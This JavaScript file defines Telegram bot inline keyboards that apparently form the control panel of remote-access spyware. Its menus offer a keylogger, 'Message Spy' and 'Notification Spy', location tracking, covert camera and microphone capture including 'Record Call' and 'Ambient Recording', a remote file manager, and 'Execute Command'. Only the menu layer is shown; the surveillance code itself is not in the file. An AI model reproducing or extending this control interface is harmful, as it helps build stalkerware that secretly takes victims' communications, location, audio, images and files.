class KeyboardBuilder {
    constructor() {
        this.emojis = {
            monitoring: '🔍',
            files: '📁',
            screenshot: '📸',
            system: '💻',
            settings: '⚙️',
            back: '◀️',
            home: '🏠',
            refresh: '🔄',
            download: '📥',
            upload: '📤',
            delete: '🗑',
            edit: '✏️',
            view: '👁',
            camera: '📷',
            microphone: '🎤',
            location: '📍',
            notification: '🔔',
            keyboard: '⌨️',
            clipboard: '📋',
            wifi: '📶',
            battery: '🔋',
            apps: '📱',
            messages: '💬',
            contacts: '📞',
            execute: '⚡'
        };
    }
    
    getMainMenu() {
        return {
            inline_keyboard: [
                [
                    { text: `${this.emojis.monitoring} Monitoring`, callback_data: 'monitoring:menu' },
                    { text: `${this.emojis.files} File Manager`, callback_data: 'files:root' }
                ],
                [
                    { text: `${this.emojis.screenshot} Screenshot`, callback_data: 'screenshot:take' },
                    { text: `${this.emojis.system} System Info`, callback_data: 'sysinfo:show' }
                ],
                [
                    { text: `${this.emojis.camera} Camera`, callback_data: 'camera:menu' },
                    { text: `${this.emojis.microphone} Microphone`, callback_data: 'mic:menu' }
                ],
                [
                    { text: `${this.emojis.location} Location`, callback_data: 'location:get' },
                    { text: `${this.emojis.notification} Notifications`, callback_data: 'notifications:list' }
                ],
                [
                    { text: `${this.emojis.apps} Apps`, callback_data: 'apps:list' },
                    { text: `${this.emojis.messages} Messages`, callback_data: 'messages:list' }
                ],
                [
                    { text: `${this.emojis.execute} Execute Command`, callback_data: 'execute:prompt' },
                    { text: `${this.emojis.settings} Settings`, callback_data: 'settings:menu' }
                ]
            ]
        };
    }
    
    getMonitoringMenu() {
        return {
            inline_keyboard: [
                [
                    { text: `${this.emojis.keyboard} Keylogger`, callback_data: 'monitoring:keylog' },
                    { text: `${this.emojis.clipboard} Clipboard`, callback_data: 'monitoring:clipboard' }
                ],
                [
                    { text: `${this.emojis.screenshot} Auto Screenshot`, callback_data: 'monitoring:auto_screenshot' },
                    { text: `${this.emojis.location} Location Tracking`, callback_data: 'monitoring:location' }
                ],
                [
                    { text: `${this.emojis.notification} Notification Spy`, callback_data: 'monitoring:notifications' },
                    { text: `${this.emojis.messages} Message Spy`, callback_data: 'monitoring:messages' }
                ],
                [
                    { text: `${this.emojis.wifi} Network Monitor`, callback_data: 'monitoring:network' },
                    { text: `${this.emojis.battery} Battery Status`, callback_data: 'monitoring:battery' }
                ],
                [
                    { text: `${this.emojis.back} Back`, callback_data: 'main_menu' },
                    { text: `${this.emojis.refresh} Refresh`, callback_data: 'monitoring:refresh' }
                ]
            ]
        };
    }
    
    getFileManagerMenu(currentPath = '/', files = []) {
        const keyboard = [];
        
        // Add navigation row
        const navRow = [];
        if (currentPath !== '/') {
            navRow.push({ text: `${this.emojis.back} Back`, callback_data: `files:back:${currentPath}` });
        }
        navRow.push({ text: `${this.emojis.home} Home`, callback_data: 'files:root' });
        navRow.push({ text: `${this.emojis.refresh} Refresh`, callback_data: `files:refresh:${currentPath}` });
        keyboard.push(navRow);
        
        // Add file/folder buttons (max 10 items)
        const displayFiles = files.slice(0, 10);
        for (let i = 0; i < displayFiles.length; i += 2) {
            const row = [];
            const file1 = displayFiles[i];
            if (file1) {
                const icon = file1.isDirectory ? '📂' : this.getFileIcon(file1.name);
                row.push({
                    text: `${icon} ${file1.name.substring(0, 20)}`,
                    callback_data: `files:${file1.isDirectory ? 'dir' : 'file'}:${file1.path}`
                });
            }
            
            const file2 = displayFiles[i + 1];
            if (file2) {
                const icon = file2.isDirectory ? '📂' : this.getFileIcon(file2.name);
                row.push({
                    text: `${icon} ${file2.name.substring(0, 20)}`,
                    callback_data: `files:${file2.isDirectory ? 'dir' : 'file'}:${file2.path}`
                });
            }
            
            keyboard.push(row);
        }
        
        // Add action buttons
        keyboard.push([
            { text: `${this.emojis.upload} Upload`, callback_data: `files:upload:${currentPath}` },
            { text: `${this.emojis.delete} Delete`, callback_data: `files:delete:${currentPath}` }
        ]);
        
        // Add main menu button
        keyboard.push([
            { text: `${this.emojis.back} Main Menu`, callback_data: 'main_menu' }
        ]);
        
        return { inline_keyboard: keyboard };
    }
    
    getFileActionMenu(filePath, fileName) {
        return {
            inline_keyboard: [
                [
                    { text: `${this.emojis.download} Download`, callback_data: `files:download:${filePath}` },
                    { text: `${this.emojis.view} View`, callback_data: `files:view:${filePath}` }
                ],
                [
                    { text: `${this.emojis.edit} Rename`, callback_data: `files:rename:${filePath}` },
                    { text: `${this.emojis.delete} Delete`, callback_data: `files:delete_file:${filePath}` }
                ],
                [
                    { text: `${this.emojis.back} Back`, callback_data: `files:back:${filePath}` }
                ]
            ]
        };
    }
    
    getCameraMenu() {
        return {
            inline_keyboard: [
                [
                    { text: '📷 Front Camera', callback_data: 'camera:front' },
                    { text: '📷 Back Camera', callback_data: 'camera:back' }
                ],
                [
                    { text: '🎥 Record Video (10s)', callback_data: 'camera:video:10' },
                    { text: '🎥 Record Video (30s)', callback_data: 'camera:video:30' }
                ],
                [
                    { text: '📸 Burst Mode (5 photos)', callback_data: 'camera:burst' },
                    { text: '🔦 Toggle Flash', callback_data: 'camera:flash' }
                ],
                [
                    { text: `${this.emojis.back} Back`, callback_data: 'main_menu' }
                ]
            ]
        };
    }
    
    getMicrophoneMenu() {
        return {
            inline_keyboard: [
                [
                    { text: '🎙 Record 10 seconds', callback_data: 'mic:record:10' },
                    { text: '🎙 Record 30 seconds', callback_data: 'mic:record:30' }
                ],
                [
                    { text: '🎙 Record 1 minute', callback_data: 'mic:record:60' },
                    { text: '🎙 Record 5 minutes', callback_data: 'mic:record:300' }
                ],
                [
                    { text: '📞 Record Call', callback_data: 'mic:call' },
                    { text: '🎵 Ambient Recording', callback_data: 'mic:ambient' }
                ],
                [
                    { text: `${this.emojis.back} Back`, callback_data: 'main_menu' }
                ]
            ]
        };
    }
    
    getSettingsMenu() {
        return {
            inline_keyboard: [
                [
                    { text: '🔔 Notifications', callback_data: 'settings:notifications' },
                    { text: '🔐 Security', callback_data: 'settings:security' }
                ],
                [
                    { text: '⏱ Intervals', callback_data: 'settings:intervals' },
                    { text: '🎨 Appearance', callback_data: 'settings:appearance' }
                ],
                [
                    { text: '📊 Data Usage', callback_data: 'settings:data' },
                    { text: '🔧 Advanced', callback_data: 'settings:advanced' }
                ],
                [
                    { text: '📥 Backup', callback_data: 'settings:backup' },
                    { text: '♻️ Reset', callback_data: 'settings:reset' }
                ],
                [
                    { text: `${this.emojis.back} Back`, callback_data: 'main_menu' }
                ]
            ]
        };
    }
    
    getNotificationMenu() {
        return {
            inline_keyboard: [
                [
                    { text: '📱 All Apps', callback_data: 'notifications:all' },
                    { text: '💬 Messages Only', callback_data: 'notifications:messages' }
                ],
                [
                    { text: '📞 Calls Only', callback_data: 'notifications:calls' },
                    { text: '📧 Email Only', callback_data: 'notifications:email' }
                ],
                [
                    { text: '🔕 Clear All', callback_data: 'notifications:clear' },
                    { text: `${this.emojis.refresh} Refresh`, callback_data: 'notifications:refresh' }
                ],
                [
                    { text: `${this.emojis.back} Back`, callback_data: 'main_menu' }
                ]
            ]
        };
    }
    
    getConfirmationMenu(action, data) {
        return {
            inline_keyboard: [
                [
                    { text: '✅ Yes, Confirm', callback_data: `confirm:${action}:${data}` },
                    { text: '❌ Cancel', callback_data: 'cancel' }
                ]
            ]
        };
    }
    
    getPaginationMenu(currentPage, totalPages, baseCallback) {
        const keyboard = [];
        const pageRow = [];
        
        if (currentPage > 1) {
            pageRow.push({ text: '⬅️ Previous', callback_data: `${baseCallback}:page:${currentPage - 1}` });
        }
        
        pageRow.push({ text: `📄 ${currentPage}/${totalPages}`, callback_data: 'noop' });
        
        if (currentPage < totalPages) {
            pageRow.push({ text: 'Next ➡️', callback_data: `${baseCallback}:page:${currentPage + 1}` });
        }
        
        keyboard.push(pageRow);
        keyboard.push([{ text: `${this.emojis.back} Back`, callback_data: 'main_menu' }]);
        
        return { inline_keyboard: keyboard };
    }
    
    getFileIcon(fileName) {
        const ext = fileName.split('.').pop().toLowerCase();
        const iconMap = {
            // Images
            jpg: '🖼', jpeg: '🖼', png: '🖼', gif: '🖼', bmp: '🖼', svg: '🖼',
            // Videos
            mp4: '🎬', avi: '🎬', mov: '🎬', mkv: '🎬', webm: '🎬',
            // Audio
            mp3: '🎵', wav: '🎵', ogg: '🎵', m4a: '🎵', flac: '🎵',
            // Documents
            pdf: '📄', doc: '📝', docx: '📝', txt: '📃', rtf: '📝',
            // Spreadsheets
            xls: '📊', xlsx: '📊', csv: '📊',
            // Presentations
            ppt: '📽', pptx: '📽',
            // Archives
            zip: '🗜', rar: '🗜', '7z': '🗜', tar: '🗜', gz: '🗜',
            // Code
            js: '💻', py: '🐍', html: '🌐', css: '🎨', json: '{}',
            // Executables
            exe: '⚡', apk: '📱', dmg: '🖥',
            // Database
            db: '🗄', sql: '🗄',
            // Config
            xml: '⚙️', yml: '⚙️', yaml: '⚙️', ini: '⚙️', conf: '⚙️'
        };
        
        return iconMap[ext] || '📎';
    }
    
    getQuickActions() {
        return {
            keyboard: [
                ['📸 Screenshot', '📁 Files'],
                ['📍 Location', '💻 System'],
                ['🔍 Monitoring', '⚙️ Settings']
            ],
            resize_keyboard: true,
            one_time_keyboard: false
        };
    }
}

module.exports = KeyboardBuilder;